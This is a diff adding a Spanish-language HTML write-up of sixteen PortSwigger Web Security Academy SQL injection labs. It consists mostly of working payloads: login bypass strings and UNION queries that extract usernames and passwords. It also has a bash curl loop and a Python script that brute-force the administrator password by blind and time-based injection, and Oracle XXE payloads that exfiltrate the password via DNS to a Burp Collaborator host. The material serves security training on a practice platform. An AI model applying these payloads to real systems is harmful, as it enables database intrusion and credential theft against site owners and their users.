@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SQL Injection | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <style>
+    .code-block { background:#0a0a0a; border:1px solid #333; border-radius:6px; padding:1rem; overflow-x:auto; color:#9fef00; font-size:0.85rem; }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <div class="d-flex gap-2">
+        <a href="../writeups.html#portswigger" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+        <a href="../writeups.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-house"></i> Inicio</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="mb-4 p-4 rounded" style="background:#111;border:1px solid #222">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">SQL Injection</span>
+        <span class="badge bg-secondary">UNION</span>
+        <span class="badge bg-secondary">Blind</span>
+        <span class="badge bg-secondary">OOB</span>
+        <span class="badge bg-secondary">Time-based</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">SQL Injection</h1>
+      <p class="text-secondary mb-0">Inyección SQL: extracción de datos ocultos, bypass de login, ataques UNION, enumeración de base de datos, blind condicional, time-based y out-of-band.</p>
+    </div>
+
+    <!-- Retrieving hidden data -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-database-exclamation"></i> Retrieving hidden data</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 1</span>SQL injection in WHERE clause allowing retrieval of hidden data</h5>
+      <pre class="code-block"><code>https://LAB-ID.web-security-academy.net/filter?category=Gifts' or 1=1 --</code></pre>
+    </section>
+
+    <!-- Subverting application logic -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-person-fill-slash"></i> Subverting application logic</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 2</span>SQL injection vulnerability allowing login bypass</h5>
+      <img src="../img/sql2.png" class="img-fluid rounded my-3 border border-secondary">
+      <div class="row g-3">
+        <div class="col-md-6">
+          <div class="p-3 rounded border border-secondary" style="background:#111">
+            <h6 class="text-warning mb-2">Forma 1</h6>
+            <pre class="code-block mb-0"><code>username: administrator' --
+password: cualquier texto</code></pre>
+          </div>
+        </div>
+        <div class="col-md-6">
+          <div class="p-3 rounded border border-secondary" style="background:#111">
+            <h6 class="text-warning mb-2">Forma 2</h6>
+            <pre class="code-block mb-0"><code>username: administrator' or 1=1 --
+password: 'or 1=1 --</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- UNION attacks -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-union"></i> Retrieving data from other tables — UNION attacks</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 3</span>UNION attack, determining the number of columns</h5>
+      <img src="../img/sql3.png" class="img-fluid rounded my-3 border border-secondary">
+      <pre class="code-block"><code>https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,null,null --</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 4</span>UNION attack, finding a column containing text</h5>
+      <img src="../img/sql4.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <pre class="code-block"><code># Determinar número de columnas
+https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,null,null --
+
+# Identificar columna con texto
+https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,'a',null --
+
+# Mostrar el texto solicitado
+https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,'p2Omtj',null --</code></pre>
+      <img src="../img/sql4.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 5</span>UNION attack, retrieving data from other tables</h5>
+      <pre class="code-block"><code># Número de columnas
+https://LAB-ID.web-security-academy.net/filter?category=Food+%26+Drink' union select null,null --
+
+# Columnas con texto
+https://LAB-ID.web-security-academy.net/filter?category=' union select 'a','a' --
+
+# Extraer usuarios y contraseñas
+https://LAB-ID.web-security-academy.net/filter?category=' union select username,password from users --</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 6</span>UNION attack, retrieving multiple values in a single column</h5>
+      <pre class="code-block"><code># Solo la 2da columna acepta texto
+# Concatenar usuario y contraseña con separador
+https://LAB-ID.web-security-academy.net/filter?category=' union select null,username||'&lt;-&gt;'||password from users --
+
+# Resultado: administrator&lt;-&gt;nqy8w4oj1tnda467u4lf</code></pre>
+    </section>
+
+    <!-- Examining the database -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-database-gear"></i> Examining the database</h3>
+
+    <h4 class="text-warning mt-3 mb-2">Querying database type and version</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 7</span>Querying database type and version on Oracle</h5>
+      <pre class="code-block"><code># Oracle requiere tabla DUAL y usa v$version
+https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,null from dual --
+
+# Sacar versión
+https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select banner,null from v$version --</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 8</span>Querying database type and version on MySQL and Microsoft</h5>
+      <p class="text-secondary small text-muted">Nota: En MySQL el comentario <code>--</code> necesita un espacio después. Se agrega texto extra tras el espacio en la URL.</p>
+      <pre class="code-block"><code>https://LAB-ID.web-security-academy.net/filter?category=Corporate+gifts' union select null,@@version -- algo</code></pre>
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">Listing the contents of the database</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 9</span>Listing database contents on non-Oracle databases (PostgreSQL)</h5>
+      <pre class="code-block"><code># Versión
+https://LAB-ID.web-security-academy.net/filter?category=Gifts' union select 'a',version() --
+
+# Listar tablas
+https://LAB-ID.web-security-academy.net/filter?category=Gifts' union select TABLE_SCHEMA,TABLE_NAME from information_schema.tables --
+
+# Listar columnas de tabla users
+https://LAB-ID.web-security-academy.net/filter?category=Gifts' union select TABLE_NAME,COLUMN_NAME from information_schema.columns --
+
+# Extraer credenciales (tabla y columnas con nombres aleatorios)
+https://LAB-ID.web-security-academy.net/filter?category=Gifts' union select username_XXXX,password_XXXX from users_XXXX --</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 10</span>Listing database contents on Oracle</h5>
+      <pre class="code-block"><code># Tablas en Oracle
+https://LAB-ID.web-security-academy.net/filter?category=Pets' union select null,TABLE_NAME from all_tables --
+
+# Columnas de la tabla USERS_XXXXX
+https://LAB-ID.web-security-academy.net/filter?category=Pets' union select TABLE_NAME,COLUMN_NAME from all_tab_columns where TABLE_NAME='USERS_XXXXX' --
+
+# Extraer credenciales
+https://LAB-ID.web-security-academy.net/filter?category=Pets' union select USERNAME_XXXX,PASSWORD_XXXX from USERS_XXXX --</code></pre>
+    </section>
+
+    <!-- Blind SQL injection -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-eye-slash"></i> Blind SQL injection vulnerabilities</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 11</span>Blind SQL injection with conditional responses</h5>
+      <p class="text-secondary">Inyección en la cookie. Script bash para extraer la contraseña carácter a carácter buscando la cadena <code>Welcome back!</code> en la respuesta.</p>
+      <pre class="code-block"><code>abc=$(echo {9..0} {a..z})
+url="https://LAB-ID.web-security-academy.net/"
+cookie='session=SESSION_ID; TrackingId=TRACKING_ID'
+truestring="Welcome back!"
+psw=""
+for ((i=1;i&lt;=20;i+=1)); do
+  for j in $abc; do
+    curl -i -s -k -b "$cookie' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),$i,1)='$j" $url | grep -o "$truestring" &gt;/dev/null
+    if [ "$?" -eq 0 ]; then
+      psw=$psw$j
+      echo "found $j | password: $psw"
+      break
+    fi
+  done
+done
+echo $psw</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 12</span>Blind SQL injection with conditional errors (Oracle)</h5>
+      <pre class="code-block"><code># Verificar tabla users
+42bE1...' and (SELECT case when (1=0) then to_char(1/0) else 'a' end from users where rownum=1)='a
+
+# Verificar longitud de contraseña
+42bE1...' and (SELECT case when (length(password)=20) then to_char(1/0) else 'a' end from users where username='administrator')='a
+
+# Extraer carácter a carácter (generar error si es correcto)
+42bE1...' and (SELECT case when (substr(password,1,1)='e') then to_char(1/0) else 'a' end from users where username='administrator')='a</code></pre>
+    </section>
+
+    <!-- Time-based blind -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-clock"></i> Exploiting blind SQL injection by triggering time delays</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 13</span>Blind SQL injection with time delays</h5>
+      <pre class="code-block"><code># Cookie TrackingId — PostgreSQL
+QN8d4azscNQM5K9F'|| pg_sleep(10) --</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 14</span>Blind SQL injection with time delays and information retrieval</h5>
+      <pre class="code-block"><code>from pwn import log
+import requests
+
+abc = 'abcdefghijklmnopqrstuvwxyz0123456789'
+url = "https://LAB-ID.web-security-academy.net/"
+s = requests.Session()
+password = ""
+p1 = log.progress("Password")
+p2 = log.progress("Trying")
+
+for p in range(20):
+    for a in abc:
+        r = s.get(url, cookies={
+            "TrackingId": "ID'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username='administrator'--",
+            "session": "SESSION_ID"
+        })
+        p2.status("pos: "+ str(p+1)+" letter: "+str(a)+" time: "+str(r.elapsed.total_seconds()))
+        if r.elapsed.total_seconds() > 3:
+            password += a
+            break
+    p1.status(password)
+p1.success(password)</code></pre>
+    </section>
+
+    <!-- OOB -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-broadcast"></i> Exploiting blind SQL injection using out-of-band (OAST) techniques</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 15</span>Blind SQL injection with out-of-band interaction</h5>
+      <p class="text-secondary">Interceptar la consulta con Burp Suite y enviar al Repeater. Abrir el Burp Collaborator para obtener el subdominio. Modificar la cookie <code>TrackingId</code> con la inyección codificada con <code>Ctrl+U</code>.</p>
+      <img src="../img/sql15.png" class="img-fluid rounded my-3 border border-secondary">
+      <pre class="code-block"><code>' UNION SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual--</code></pre>
+      <p class="text-secondary small">Versión URL-encoded para la cookie:</p>
+      <pre class="code-block"><code>' UNION+SELECT+extractvalue(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code></pre>
+      <img src="../img/sql15.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/sql15.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 16</span>Blind SQL injection with out-of-band data exfiltration</h5>
+      <p class="text-secondary">Igual que el anterior pero exfiltrando la contraseña del administrador como subdominio DNS.</p>
+      <pre class="code-block"><code>'+UNION+SELECT+extractvalue(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.COLLABORATOR.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual --</code></pre>
+    </section>
+
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
